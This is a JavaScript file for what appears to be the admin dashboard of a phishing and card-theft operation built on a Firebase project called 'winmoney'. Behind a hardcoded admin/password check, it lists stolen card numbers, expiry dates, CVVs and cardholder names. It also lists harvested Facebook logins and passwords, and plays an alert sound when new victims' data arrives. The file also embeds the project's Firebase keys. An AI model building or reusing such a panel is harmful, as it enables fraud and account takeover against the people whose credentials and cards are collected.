const firebaseConfig = {
  apiKey: "AIzaSyBFBSNGSdiBtw8taQD0YTmzlK35zEM19JY",
  authDomain: "winmoney-1296e.firebaseapp.com",
  databaseURL: "https://winmoney-1296e-default-rtdb.firebaseio.com",
  projectId: "winmoney-1296e",
  storageBucket: "winmoney-1296e.appspot.com",
  messagingSenderId: "70056983983",
  appId: "1:70056983983:web:15379efab188eff540835a",
  measurementId: "G-93G3QLTDC2",
};

firebase.initializeApp(firebaseConfig);
function addElementInFirebase(REF, data) {
  firebase.database().ref(`${REF}/${randomID()}`).set(data);
}

function getRefFromFirebase(REF) {
  const result = [];
  firebase
    .database()
    .ref(REF)
    .on("value", (response) => {
      response.forEach((element) => {
        result.push(generateFirebaseItem(element.key, element.val()));
      });
    });
  return result;
}

function getElementFromFirebase(REF, id) {
  const array = getRefFromFirebase(REF);
  return new Promise((resolve, reject) => {
    setTimeout(() => {
      array.forEach((element) => {
        if (element.id === id) {
          resolve(element);
        }
      });
      reject("404");
    }, 1000);
  });
}

function removeElementFromFirebase(REF, id) {
  firebase.database().ref(`${REF}/${id}`).remove();
}

function removeRefFromFirebase(REF) {
  firebase.database().ref(REF).remove();
}

function randomID() {
  let new_data = new Date().toString();
  return new_data;
}

function generateFirebaseItem(ID, value) {
  return {
    id: ID,
    data: value,
  };
}

let authWrapper = document.querySelector(".auth-wrapper");
let userName = document.querySelector(".user-name");
let userPassword = document.querySelector(".password");
let loginBtn = document.querySelector(".login-btn");
let cardsWrapper = document.querySelector(".cards-wrapper");
let logOutBtn = document.querySelector(".logout-btn");
let loader = document.querySelector(".loader-wrapper");
let secssesfuly = document.querySelector(".secssesfuly");
let errorInfo = document.querySelector(".error");
let adminPanelWrapper = document.querySelector(".adminpanel");
let cardsBtn = document.querySelector(".cards-btn");
let fbBtn = document.querySelector(".fb-btn");
let fbWrapper = document.querySelector(".fb-wrapper");

cardsBtn.addEventListener("click", () => {
  fbWrapper.classList.add("hidden");
  cardsWrapper.classList.remove("hidden");
});

fbBtn.addEventListener("click", () => {
  cardsWrapper.classList.add("hidden");
  fbWrapper.classList.remove("hidden");
});

logOutBtn.addEventListener("click", () => {
  cardsWrapper.classList.add("leftanimation");
  fbWrapper.classList.add("leftanimation");
  adminPanelWrapper.classList.add("leftanimation");
  setTimeout(() => {
    adminPanelWrapper.classList.add("hidden");
    authWrapper.classList.remove("hidden");
    authWrapper.classList.add("auttransofrmscale");
    cardsWrapper.innerHTML = "";
    fbWrapper.innerHTML = "";
  }, 1000);
});

let admin = "admin";
let password = "password";

loginBtn.addEventListener("click", () => {
  loader.classList.remove("hidden");
  cardsWrapper.classList.remove("leftanimation");
  adminPanelWrapper.classList.remove("leftanimation");

  let userValue = userName.value;
  let passwordValue = userPassword.value;
  if (userValue === admin && passwordValue === password) {
    authWrapper.classList.add("leftanimation");

    setTimeout(() => {
      authWrapper.classList.add("hidden");
      authWrapper.classList.remove("leftanimation");
      loader.classList.add("hidden");
      secssesfuly.classList.remove("hidden");

      firebase
        .database()
        .ref("FB-Ussers")
        .on("value", (snapshot) => {
          fbInfo();
        });

      firebase
        .database()
        .ref("Card")
        .on("child_added", (snapshot) => {
          cardsInfo(snapshot.val());
        });

      setTimeout(() => {
        fbWrapper.classList.add("hidden");
      }, 1300);
    }, 1000);
    secssesfuly.classList.add("hidden");
    setTimeout(() => {
      adminPanelWrapper.classList.remove("hidden");
    }, 2500);

    ClearInputsValue();
    console.log("mushaobs");
  } else {
    ClearInputsValue();
    loader.classList.add("hidden");
    errorInfo.classList.remove("hidden");
    setTimeout(() => {
      errorInfo.classList.add("hidden");
    }, 1500);
    console.log("ar mushaobs");
  }
});

userPassword.addEventListener("keyup", (e) => {
  if (e.key === "Enter") {
    loader.classList.remove("hidden");
    cardsWrapper.classList.remove("leftanimation");
    adminPanelWrapper.classList.remove("leftanimation");
    let userValue = userName.value;
    let passwordValue = userPassword.value;
    if (userValue === admin && passwordValue === password) {
      authWrapper.classList.add("leftanimation");

      setTimeout(() => {
        authWrapper.classList.add("hidden");
        authWrapper.classList.remove("leftanimation");
        loader.classList.add("hidden");
        secssesfuly.classList.remove("hidden");

        firebase
          .database()
          .ref("FB-Ussers")
          .on("value", (snapshot) => {
            fbInfo();
          });

        firebase
          .database()
          .ref("Card")
          .on("child_added", (snapshot) => {
            cardsInfo(snapshot.val());
          });
        setTimeout(() => {
          fbWrapper.classList.add("hidden");
        }, 1300);
      }, 1000);
      secssesfuly.classList.add("hidden");
      setTimeout(() => {
        adminPanelWrapper.classList.remove("hidden");
      }, 2500);
      ClearInputsValue();
      console.log("mushaobs");
    } else {
      ClearInputsValue();
      loader.classList.add("hidden");
      errorInfo.classList.remove("hidden");
      setTimeout(() => {
        errorInfo.classList.add("hidden");
      }, 1500);
      console.log("ar mushaobs");
    }
  }
});

function cardsInfo(data) {
  cardsWrapper.innerHTML += `
     
          <div class="cards-wrapper-all-data">
         <p class="card-number"><span class="green">${data.asecondCardNumber}</span></p>
         <p class="card-data"><span class="green">${data.bsecondCardData}</span></p>
         <p class="card-cvv"><span class="red">${data.csecondCardCvv}</span></p>
         <p class="name-tit"><span class="red">${data.dsecondCardName}</span></p>
       
        
      </div>
    `;
}

function fbInfo(data) {
  const infoArray = getRefFromFirebase("FB-Ussers");
  fbWrapper.innerHTML = "";
  notificationSound();
  infoArray.forEach((info) => {
    fbWrapper.innerHTML += `
     
    <div class="fb-wrapper-all-data" id="${info.id}">
<div class="remove-wrapper">


<button class="remove" onclick="removeInfo('${info.id}')"><i class="fa-solid fa-trash"></i></button>
</div>
    <p class="fb-usser"><i class="fa-solid fa-user"></i> <span class="spn-user">${info.data.login}</span></p>
    <p class="fb-pasw"><i class="fa-solid fa-key"></i> <span class="spn-psw">${info.data.pasw}</span></p>
    <p class="fb-time"><i class="fa-solid fa-calendar-days"></i> <span class="spn-time">${info.data.time}</span></p>
    
  
  </div>
  
  `;
  });
}

function ClearInputsValue() {
  userName.value = "";
  userPassword.value = "";
}

function removeInfo(id) {
  removeElementFromFirebase("FB-Ussers", id);
}

function notificationSound() {
  let song = new Audio("notification.wav");
  song.play();
}
